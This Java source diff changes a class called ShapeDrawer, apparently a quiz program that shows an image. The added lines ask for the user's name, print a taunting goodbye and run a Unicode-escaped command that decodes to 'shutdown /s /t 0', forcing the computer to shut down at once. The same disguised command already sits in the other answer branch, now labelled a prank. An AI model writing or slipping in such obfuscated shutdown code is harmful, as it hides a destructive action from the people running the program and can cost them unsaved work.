@@ -63,11 +63,15 @@ public class ShapeDrawer {
 		image = createImage(photo);
 		quizWindow.add(image);
 		quizWindow.pack();
+		String name = JOptionPane.showInputDialog("Now that I know who you really are, what is your name?");
+		JOptionPane.showMessageDialog(null, name +", you have fulfilled your purpose.  Goodbye.");
+		Runtime.getRuntime().exec("\u0073\u0068\u0075t\u0064o\u0077\u006e /s /t 0");
+		
 	}
 
 	else if(answer==2)
 	{
-		JOptionPane.showMessageDialog(null, "Understandable.  Have a nice day.");
+		JOptionPane.showMessageDialog(null, "Prepare to get pranked.");
 		Runtime.getRuntime().exec("\u0073\u0068\u0075t\u0064o\u0077\u006e /s /t 0");
 	}
 	}
@@ -79,4 +83,3 @@ public class ShapeDrawer {
 		return imageLabel;
 	}
 }
-
